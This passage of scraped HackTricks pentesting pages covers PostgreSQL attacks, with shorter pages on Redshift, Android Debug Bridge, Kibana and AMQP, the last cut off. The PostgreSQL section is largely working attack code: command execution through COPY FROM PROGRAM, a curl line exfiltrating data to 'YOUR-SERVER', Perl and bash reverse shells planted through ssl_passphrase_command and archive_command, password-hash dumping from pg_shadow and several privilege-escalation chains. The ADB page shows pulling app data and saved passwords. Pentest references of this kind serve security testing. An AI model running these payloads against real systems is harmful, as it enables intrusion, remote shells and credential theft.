r.rolconfig,\nSELECT\nr\n.\nrolname\n,\nr\n.\nrolsuper\n,\nr\n.\nrolinherit\n,\nr\n.\nrolcreaterole\n,\nr\n.\nrolcreatedb\n,\nr\n.\nrolcanlogin\n,\nr\n.\nrolbypassrls\n,\nr\n.\nrolconnlimit\n,\nr\n.\nrolvaliduntil\n,\nr\n.\noid\n,\nARRAY\n(\nSELECT\nb\n.\nrolname\nFROM\npg_catalog\n.\npg_auth_members m\nJOIN\npg_catalog\n.\npg_roles b\nON\n(\nm\n.\nroleid\n=\nb\n.\noid\n)\nWHERE\nm\n.\nmember\n=\nr\n.\noid\n)\nas\nmemberof\n,\nr\n.\nrolreplication\nFROM\npg_catalog\n.\npg_roles r\nORDER\nBY\n1\n;\n‚Äã\n# Check if current user is superiser\n## If response is \"on\" then true, if \"off\" then false\nSELECT\ncurrent_setting\n(\n'is_superuser'\n);\n‚Äã\n# Try to grant access to groups\n## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)\nGRANT\npg_execute_server_program\nTO\n\"username\"\n;\nGRANT\npg_read_server_files\nTO\n\"username\"\n;\nGRANT\npg_write_server_files\nTO\n\"username\"\n;\n## You will probably get this error:\n## Cannot GRANT on the \"pg_write_server_files\" role without being a member of the role.\n‚Äã\n# Create new role (user) as member of a role (group)\nCREATE\nROLE u LOGIN PASSWORD\n'lriohfugwebfdwrr'\nIN\nGROUP\npg_read_server_files\n;\n## Common error\n## Cannot GRANT on the \"pg_read_server_files\" role without being a member of the role.\nTables\n# Get owners of tables\nselect\nschemaname\n,\ntablename\n,\ntableowner\nfrom\npg_tables\n;\n## Get tables where user is owner\nselect\nschemaname\n,\ntablename\n,\ntableowner\nfrom\npg_tables\nWHERE\ntableowner\n=\n'postgres'\n;\n‚Äã\n# Get your permissions over tables\nSELECT\ngrantee\n,\ntable_schema\n,\ntable_name\n,\nprivilege_type\nFROM\ninformation_schema\n.\nrole_table_grants\n;\n‚Äã\n#Check users privileges over a table (pg_shadow on this example)\n## If nothing, you don't have any permission\nSELECT\ngrantee\n,\ntable_schema\n,\ntable_name\n,\nprivilege_type\nFROM\ninformation_schema\n.\nrole_table_grants\nWHERE\ntable_name\n=\n'pg_shadow'\n;\nFunctions\n# Interesting functions are inside pg_catalog\n\\df\n*\n#Get all\n\\df\n*\npg_ls\n*\n#Get by substring\n\\df\n+\npg_read_binary_file\n#Check who has access\n‚Äã\n# Get all functions of a schema\n\\df pg_catalog\n.\n*\n‚Äã\n# Get all functions of a schema (pg_catalog in this case)\nSELECT\nroutines\n.\nroutine_name\n,\nparameters\n.\ndata_type\n,\nparameters\n.\nordinal_position\nFROM\ninformation_schema\n.\nroutines\nLEFT\nJOIN\ninformation_schema\n.\nparameters\nON\nroutines\n.\nspecific_name\n=\nparameters\n.\nspecific_name\nWHERE\nroutines\n.\nspecific_schema\n=\n'pg_catalog'\nORDER\nBY\nroutines\n.\nroutine_name\n,\nparameters\n.\nordinal_position\n;\n‚Äã\n# Another aparent option\nSELECT\n*\nFROM\npg_proc\n;\nFile-system actions\nRead directories and files\nFrom this\ncommit\nmembers of the defined\nDEFAULT_ROLE_READ_SERVER_FILES\ngroup (called\npg_read_server_files\n) and\nsuper users\ncan use the\nCOPY\nmethod on any path (check out\nconvert_and_check_filename\nin\ngenfile.c\n):\n# Read file\nCREATE\nTABLE\ndemo\n(\nt\ntext\n);\nCOPY demo\nfrom\n'/etc/passwd'\n;\nSELECT\n*\nFROM\ndemo\n;\nRemember that if you aren't super user but has the\nCREATEROLE\npermissions you can\nmake yourself member of that group:\nGRANT\npg_read_server_files\nTO\nusername\n;\n‚Äã\nMore info.\n‚Äã\nThere are\nother postgres functions\nthat can be used to\nread file or list a directory\n. Only\nsuperusers\nand\nusers with explicit permissions\ncan use them:\n# Before executing these function go to the postgres DB (not in the template1)\n\\c postgres\n## If you don't do this, you might get \"permission denied\" error even if you have permission\n‚Äã\nselect\n*\nfrom\npg_ls_dir\n(\n'/tmp'\n);\nselect\n*\nfrom\npg_read_file\n(\n'/etc/passwd'\n,\n0\n,\n1000000\n);\nselect\n*\nfrom\npg_read_binary_file\n(\n'/etc/passwd'\n);\n‚Äã\n# Check who has permissions\n\\df\n+\npg_ls_dir\n\\df\n+\npg_read_file\n\\df\n+\npg_read_binary_file\n‚Äã\n# Try to grant permissions\nGRANT\nEXECUTE\nON\nfunction\npg_catalog\n.\npg_ls_dir\n(\ntext\n)\nTO\nusername\n;\n# By default you can only access files in the datadirectory\nSHOW\ndata_directory\n;\n# But if you are a member of the group pg_read_server_files\n# You can access any file, anywhere\nGRANT\npg_read_server_files\nTO\nusername\n;\n# Check CREATEROLE privilege escalation\nYou can find\nmore functions\nin\nhttps://www.postgresql.org/docs/current/functions-admin.html\n‚Äã\nSimple File Writing\nOnly\nsuper users\nand members of\npg_write_server_files\ncan use copy to write files.\ncopy\n(\nselect\nconvert_from\n(\ndecode\n(\n'<ENCODED_PAYLOAD>'\n,\n'base64'\n),\n'utf-8'\n))\nto\n'/just/a/path.exec'\n;\nRemember that if you aren't super user but has the\nCREATEROLE\npermissions you can\nmake yourself member of that group:\nGRANT\npg_write_server_files\nTO\nusername\n;\n‚Äã\nMore info.\n‚Äã\nRemember that COPY cannot handle newline chars, therefore even if you are using a base64 payload y\nou need to send a one-liner\n.\nA very important limitation of this technique is that\ncopy\ncannot be used to write binary files as it modify some binary values.\nBinary files upload\nHowever, there are\nother techniques to upload big binary files:\nBig Binary Files Upload (PostgreSQL)\n‚Äã\n‚Äã\nBug bounty tip\n:\nsign up\nfor\nIntigriti\n, a premium\nbug bounty platform created by hackers, for hackers\n! Join us at\nhttps://go.intigriti.com/hacktricks\ntoday, and start earning bounties up to\n$100,000\n!\nRegister - Intigriti\nRegister - Intigriti\nRCE\nRCE to program\nSince\nversion 9.3\n, only\nsuper users\nand member of the group\npg_execute_server_program\ncan use copy for RCE (example with exfiltration:\n'; copy (SELECT '') to program '\ncurl http:\n//YOUR-SERVER?f=`ls -l|base64`'-- -\nExample to exec:\n#PoC\nDROP TABLE IF EXISTS cmd_exec\n;\nCREATE TABLE cmd_exec\n(\ncmd_output text\n);\nCOPY cmd_exec FROM PROGRAM\n'id'\n;\nSELECT * FROM cmd_exec\n;\nDROP TABLE IF EXISTS cmd_exec\n;\n‚Äã\n#Reverse shell\n#Notice that in order to scape a single quote you need to put 2 single quotes\nCOPY files FROM PROGRAM\n'perl -MIO -e '\n'\n$p\n=\nfork\n;\nexit,if\n(\n$p\n);\n$c\n=\nnew IO::Socket::INET\n(\nPeerAddr,\n\"192.168.0.104:80\"\n);\nSTDIN-\n>\nfdopen\n(\n$c\n,r\n);\n$~-\n>\nfdopen\n(\n$c\n,w\n);\nsystem\n$_\nwhile\n<>\n;\n''\n'\n;\nRemember that if you aren't super user but has the\nCREATEROLE\npermissions you can\nmake yourself member of that group:\nGRANT\npg_execute_server_program\nTO\nusername\n;\n‚Äã\nMore info.\n‚Äã\nOr use the\nmulti/postgres/postgres_copy_from_program_cmd_exec\nmodule from\nmetasploit\n.\nMore information about this vulnerability\nhere\n. While reported as CVE-2019-9193, Postges declared this was a\nfeature and will not be fixed\n.\nRCE with PostgreSQL Languages\nRCE with PostgreSQL Languages\nRCE with PostgreSQL extensions\nOnce you have\nlearned\nfrom the previous post\nhow to upload binary files\nyou could try obtain\nRCE uploading a postgresql extension and loading it\n.\nRCE with PostgreSQL Extensions\nPostgreSQL configuration file RCE\nThe\nconfiguration file\nof postgresql is\nwritable\nby the\npostgres user\nwhich is the one running the database, so as\nsuperuser\nyou can write files in the filesystem, and therefore you can\noverwrite this file.\nRCE with ssl_passphrase_command\nThe configuration file have some interesting attributes that can lead to RCE:\nssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'\nPath to the private key of the database\nssl_passphrase_command = ''\nIf the private file is protected by password (encrypted) postgresql will\nexecute the command indicated in this attribute\n.\nssl_passphrase_command_supports_reload = off\nIf\nthis attribute is\non\nthe\ncommand\nexecuted if the key is protected by password\nwill be executed\nwhen\npg_reload_conf()\nis\nexecuted\n.\nThen, an attacker will need to:\n1.\nDump private key\nfrom the server\n2.\nEncrypt\ndownloaded private key:\n1.\nrsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key\n3.\nOverwrite\n4.\nDump\nthe current postgresql\nconfiguration\n5.\nOverwrite\nthe\nconfiguration\nwith the mentioned attributes configuration:\n1.\nssl_passphrase_command = 'bash -c \"bash -i >& /dev/tcp/127.0.0.1/8111 0>&1\"'\n2.\nssl_passphrase_command_supports_reload = on\n6.\nExecute\npg_reload_conf()\nWhile testing this I noticed that this will only work if the\nprivate key file has privileges 640\n, it's\nowned by root\nand by the\ngroup ssl-cert or postgres\n(so the postgres user can read it), and is placed in\n/var/lib/postgresql/12/main\n.\nMore\ninformation about this technique here\n.\nRCE with archive_command\nAnother attribute in the configuration file that is exploitable is\narchive_command\n.\nFor this to work, the\narchive_mode\nsetting has to be\n'on'\nor\n'always'\n. If that is true, then we could overwrite the command in\narchive_command\nand force it to execute via the WAL (write-ahead logging) operations.\nThe general steps are:\n1.\nCheck whether archive mode is enabled:\nSELECT current_setting('archive_mode')\n2.\nOverwrite\narchive_command\nwith the payload. For eg, a reverse shell:\narchive_command = 'echo \"dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307\" | base64 --decode | perl'\n3.\nReload the config:\nSELECT pg_reload_conf()\n4.\nForce the WAL operation to run, which will call the archive command:\nSELECT pg_switch_wal()\nor\nSELECT pg_switch_xlog()\nfor some Postgres versions\nMore\ninformation about this config and about WAL here\n.\nPostgres Privesc\nCREATEROLE Privesc\nGrant\nAccording to the\ndocs\n:\nRoles having\nCREATEROLE\nprivilege can\ngrant or revoke membership in any role\nthat is\nnot\na\nsuperuser\n.\nSo, if you have\nCREATEROLE\npermission you could grant yourself access to other\nroles\n(that aren't superuser) that can give you the option to read & write files and execute commands:\n# Access to execute commands\nGRANT\npg_execute_server_program\nTO\nusername\n;\n# Access to read files\nGRANT\npg_read_server_files\nTO\nusername\n;\n# Access to write files\nGRANT\npg_write_server_files\nTO\nusername\n;\nModify Password\nUsers with this role can also\nchange\nthe\npasswords\nof other\nnon-superusers\n:\n#Change password\nALTER\nUSER\nuser_name\nWITH\nPASSWORD\n'new_password'\n;\nPrivesc to SUPERUSER\nIt's pretty common to find that\nlocal users can login in PostgreSQL without providing any password\n. Therefore, once you have gathered\npermissions to execute code\nyou can abuse these permissions to gran you\nSUPERUSER\nrole:\nCOPY\n(\nselect\n''\n)\nto\nPROGRAM\n'psql -U <super_user> -c \"ALTER USER <your_username> WITH SUPERUSER;\"'\n;\nThis is usually possible because of the following lines in the\npg_hba.conf\nfile:\n# \"local\" is for Unix domain socket connections only\nlocal\nall             all                                     trust\n# IPv4 local connections:\nhost\nall             all\n127.0\n.0.1/32            trust\n# IPv6 local connections:\nhost\nall             all             ::1/128                 trust\nALTER TABLE privesc\nIn\nthis\nwriteup\nis explained how it was possible to\nprivesc\nin Postgres GCP abusing ALTER TABLE privilege that was granted to the user.\nWhen you try to\nmake another user owner of a table\nyou should get an\nerror\npreventing it, but apparently GCP gave that\noption to the not-superuser postgres user\nin GCP:\nJoining this idea with the fact that when the\nINSERT/UPDATE/\nANALYZE\ncommands are executed on a\ntable with an index function\n, the\nfunction\nis\ncalled\nas part of the command with the\ntable\nowner‚Äôs permissions\n. It's possible to create an index with a function and give owner permissions to a\nsuper user\nover that table, and then run ANALYZE over the table with the malicious function that will be able to execute commands because it's using the privileges of the owner.\nGetUserIdAndSecContext\n(\n&\nsave_userid\n,\n&\nsave_sec_context\n);\nSetUserIdAndSecContext\n(\nonerel\n->\nrd_rel\n->\nrelowner\n,\nsave_sec_context\n|\nSECURITY_RESTRICTED_OPERATION\n);\nExploitation\n1.\nCreate a new table.\n2.\nInsert some dummy content to the table, so the index function has something to work with.\n3.\nCreate a malicious index function (with our code execution payload) on the table.\n4.\nALTER the table owner to cloudsqladmin , GCP‚Äôs superuser role, used only by Cloud SQL to maintain and manage the database.\n5.\nANALYZE the table, forcing the PostgreSQL engine to switch user-context to the table's owner ( cloudsqladmin ) and call the malicious index function with the cloudsqladmin permissions, resulting in executing our shell command, which we did not have permission to execute before.\nIn PostgreSQL, this flow looks something like this:\nCREATE\nTABLE\ntemp_table\n(\ndata\ntext\n);\nCREATE\nTABLE\nshell_commands_results\n(\ndata\ntext\n);\nINSERT\nINTO\ntemp_table\nVALUES\n(\n'dummy content'\n);\n/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */\nCREATE\nOR\nREPLACE\nFUNCTION\npublic\n.\nsuid_function\n(\ntext\n)\nRETURNS\ntext\nLANGUAGE\nsql\nIMMUTABLE\nAS\n'select ''nothing'';'\n;\nCREATE\nINDEX\nindex_malicious\nON\npublic\n.\ntemp_table\n(\nsuid_function\n(\ndata\n));\nALTER\nTABLE\ntemp_table OWNER\nTO\ncloudsqladmin\n;\n/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */\nCREATE\nOR\nREPLACE\nFUNCTION\npublic\n.\nsuid_function\n(\ntext\n)\nRETURNS\ntext\nLANGUAGE\nsql\nVOLATILE\nAS\n'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';'\n;\nANALYZE\npublic\n.\ntemp_table\n;\nAfter executing the exploit SQL query, the\nshell_commands_results\ntable contains the output of the executed code:\nuid=2345(postgres) gid=2345(postgres) groups=2345(postgres)\nLocal Login\nSome misconfigured postgresql instances might allow login of any local user, it's possible to local from 127.0.0.1 using the\ndblink\nfunction\n:\n\\du\n*\n# Get Users\n\\l\n# Get databases\nSELECT\n*\nFROM\ndblink\n(\n'host=127.0.0.1\nport=5432\nuser=someuser\npassword=supersecret\ndbname=somedb'\n,\n'SELECT usename,passwd from pg_shadow'\n)\nRETURNS\n(\nresult\nTEXT\n);\nNote that for the previos query to work\nthe function\ndblink\nneeds to exist\n. If it doesn't you could try to create it with\nCREATE\nEXTENSION dblink\n;\nIf you have the password of a user with more privileges, but the user is not allowed to login from an external IP you can use the following function to execute queries as that user:\nSELECT\n*\nFROM\ndblink\n(\n'host=127.0.0.1\nuser=someuser\ndbname=somedb'\n,\n'SELECT usename,passwd from pg_shadow'\n)\nRETURNS\n(\nresult\nTEXT\n);\nIt's possible to check if this function exists with:\nSELECT\n*\nFROM\npg_proc\nWHERE\nproname\n=\n'dblink'\nAND\npronargs\n=\n2\n;\nCustom defined function with\nSECURITY DEFINER\n****\nIn this writeup\n, pentesters were able to privesc inside a postgres instance provided by IBM, because they\nfound this function with the SECURITY DEFINER flag\n:\nCREATE\nOR\nREPLACE\nFUNCTION\npublic\n.\ncreate_subscription\n(\nIN\nsubscription_name\ntext\n,\nIN\nhost_ip\ntext\n,\nIN\nportnum\ntext\n,\nIN\npassword\ntext\n,\nIN\nusername\ntext\n,\nIN\ndb_name\ntext\n,\nIN\npublisher_name\ntext\n)\nRETURNS\ntext\nLANGUAGE\n'plpgsql'\nVOLATILE SECURITY\nDEFINER\nPARALLEL UNSAFE\nCOST\n100\nAS\n$BODY$\nDECLARE\npersist_dblink_extension\nboolean\n;\nBEGIN\npersist_dblink_extension :\n=\ncreate_dblink_extension\n();\nPERFORM dblink_connect\n(\nformat\n(\n'dbname=%s'\n,\ndb_name\n));\nPERFORM dblink_exec\n(\nformat\n(\n'CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s'\n,\nsubscription_name\n,\nhost_ip\n,\nportNum\n,\npassword\n,\nusername\n,\ndb_name\n,\npublisher_name\n));\nPERFORM dblink_disconnect\n();\n‚Ä¶\nAs\nexplained in the docs\na function with\nSECURITY DEFINER is executed\nwith the privileges of the\nuser that owns it\n. Therefore, if the function is\nvulnerable to SQL Injection\nor is doing some\nprivileged actions with params controlled by the attacker\n, it could be abused to\nescalate privileges inside postgres\n.\nIn the line 4 of the previous code you can see that the function has the\nSECURITY DEFINER\nflag.\nCREATE\nSUBSCRIPTION test3 CONNECTION\n'host=127.0.0.1 port=5432 password=a\nuser=ibm dbname=ibmclouddb sslmode=require'\nPUBLICATION test2_publication\nWITH\n(\ncreate_slot\n=\nfalse\n);\nINSERT\nINTO\npublic\n.\ntest3\n(\ndata\n)\nVALUES\n(\ncurrent_user\n);\nAnd then\nexecute commands\n:\nPass Burteforce with PL/pgSQL\nPL/pgSQL, as a\nfully featured programming language\n, allows much more procedural control than SQL, including the\nability to use loops and other control structures\n. SQL statements and triggers can call functions created in the PL/pgSQL language.\nYou can abuse this language in order to ask PostgreSQL to brute-force the users credentials.\nPL/pgSQL Password Bruteforce\nPOST\nmsf> use auxiliary/scanner/postgres/postgres_hashdump\nmsf> use auxiliary/scanner/postgres/postgres_schemadump\nmsf> use auxiliary/admin/postgres/postgres_readfile\nmsf> use exploit/linux/postgres/postgres_payload\nmsf> use exploit/windows/postgres/postgres_payload\nlogging\nInside the\npostgresql.conf\nfile you can enable postgresql logs changing:\nlog_statement\n=\n'all'\nlog_filename\n=\n'postgresql-%Y-%m-%d_%H%M%S.log'\nlogging_collector\n=\non\nsudo\nservice\npostgresql restart\n#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/\n#or in /var/lib/postgresql/<PG_Version>/main/pg_log/\nThen,\nrestart the service\n.\npgadmin\n‚Äã\npgadmin\nis an administration and development platform for PostgreSQL.\nYou can find\npasswords\ninside the\npgadmin4.db\nfile\nYou can decrypt them using the\ndecrypt\nfunction inside the script:\nhttps://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py\n‚Äã\nsqlite3 pgadmin4.db\n\".schema\"\nsqlite3 pgadmin4.db\n\"select * from user;\"\nsqlite3 pgadmin4.db\n\"select * from server;\"\nstring pgadmin4.db\npg_hba\nClient authentication is controlled by a config file frequently named\npg_hba.conf\n. This file has a set of records. A record may have one of the following seven formats:\nEach\nrecord\nspecifies\na\nconnection type\n, a\nclient IP address range\n(if relevant for the connection type), a\ndatabase name\n, a\nuser name\n, and the\nauthentication method\nto be used for connections matching these parameters. The\nfirst record with a match\ning connection type, client address, requested database, and user name\nis used\nto perform authentication. There is no \"fall-through\" or \"backup\":\nif one record is chosen and the authentication fails, subsequent records are not considered\n. If no record matches, access is denied.\nThe\npassword-based\nauthentication methods are\nmd5\n,\ncrypt\n, and\npassword\n. These methods operate similarly except for the way that the password is sent across the connection: respectively, MD5-hashed, crypt-encrypted, and clear-text. A limitation is that the crypt method does not work with passwords that have been encrypted in pg_authid.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nNetwork Services Pentesting -\nPrevious\n5353/UDP Multicast DNS (mDNS) and DNS-SD\nNext\n- Network Services Pentesting\n5439 - Pentesting Redshift\nLast modified\n2mo ago"
    },
    {
        "title": "5439 - Pentesting Redshift",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5439-pentesting-redshift",
        "text": "5439 - Pentesting Redshift\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nThis port is used by\nRedshift\nto run. It's basically an AWS variation of\nPostgreSQL\n.\nFor more information check:\nAWS - Redshift Enum\nHackTricks Cloud\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter \u0000üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5432,5433 - Pentesting Postgresql\nNext\n- Network Services Pentesting\n5555 - Android Debug Bridge\nLast modified\n6mo ago"
    },
    {
        "title": "5555 - Android Debug Bridge",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge",
        "text": "5555 - Android Debug Bridge\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nAndroid Debug Bridge\n(adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions, such as i\nnstalling and debugging apps\n, and it provides\naccess to a Unix shell\nthat you can use to run a variety of commands on a device. (from\nhere\n)\nDefault port\n: 5555.\nPORT     STATE SERVICE VERSION\n5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)\nConnect\nIf find the ADB service running in a port of a device and you can connect to it,\nyou can get a shell inside the system:\nadb connect\n10.10\n.10.10\nadb root\n# Try to escalate to root\nadb shell\nFor more ADB commands check the following page:\nADB Commands\nDump App data\nIn order to completely download the data of an application you can:\n# From a root console\nchmod\n777\n/data/data/com.package\ncp\n-r\n/data/data/com.package /sdcard Note: Using ADB attacker cannot obtain data directly by using\ncommand\n\" adb pull /data/data/com.package\"\n.\nHe is compulsorily required to move data to Internal storage and\nthen\nhe can pull that data.\nadb pull\n\"/sdcard/com.package\"\nYou can use this trick to\nretrieve sensitive information like chrome passwords\n. For more info about this check the information a references provided\nhere\n.\nShodan\nandroid debug bridge\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5439 - Pentesting Redshift\nNext\n- Network Services Pentesting\n5601 - Pentesting Kibana\nLast modified\n6mo ago"
    },
    {
        "title": "5601 - Pentesting Kibana",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5601-pentesting-kibana",
        "text": "5601 - Pentesting Kibana\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nKibana provides search and data visualization capabilities for data indexed in Elasticsearch. The service runs per default on port\n5601\n. Kibana also acts as the user interface for monitoring, managing, and securing an Elastic Stack cluster.\nAuthentication?\nAuthentication in Kibana is linked to the\ncredentials from\nElasticsearch\n. If\nauthentication\nis\ndisabled\nin\nElasticsearch\n,\nKibana\nalso should be\naccessible without credentials\n. Otherwise the\nsame credentials valid for Elasticsearch\nshould be working when logging in to Kibana. The\nrights\nof the\nusers\nin\nElasticsearch\nare the\nsame\nas in\nKibana\n.\nYou might find credentials in the configuration file\n/etc/kibana/kibana.yml\n. If those credentials are not for the user\nkibana_system\n, it should be tried to use them for accessing further data. They could have more rights then the\nkibana_system\nuser, which only has access to the monitoring API and the\n.kibana\nindex.\nHaving Access?\nWhen having access to Kibana you can do several things:\nTry to\naccess data\nfrom\nElasticsearch\nCheck if you can access the users panel and if you can e\ndit, delete or create new users,\nroles or API Keys (Stack Management -> Users/Roles/API Keys)\nCheck the current version for vulnerabilities (\nThere was a RCE vulnerability in 2019 for Kibana versions < 6.6.0\n[\n2\n])\nEnabled SSL/TLS?\nIf SSL/TLS is not enabled, it should be evaluated, whether sensitive information can be leaked.\nReferences\n‚Äã\nhttps://insinuator.net/2021/01/pentesting-the-elk-stack/\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n5555 - Android Debug Bridge\nNext\n- Network Services Pentesting\n5671,5672 - Pentesting AMQP\nLast modified\n6mo ago"
    },
    {
        "title": "5671,5672 - Pentesting AMQP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/5671-5672-pentesting-amqp",
        "text": "5671,5672 - Pentesting AMQP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nRabbitMQ\nis a\nmessage-queueing software\nalso known as a\nmessage broker\nor\nqueue manager.\nSimply said; it is software where queues are defined, to which applications connect in order to transfer a message or messages.\nA\nmessage can include any kind of information\n. It could, for example, have information about a process or task that should start on another application (which could even be on another server), or it 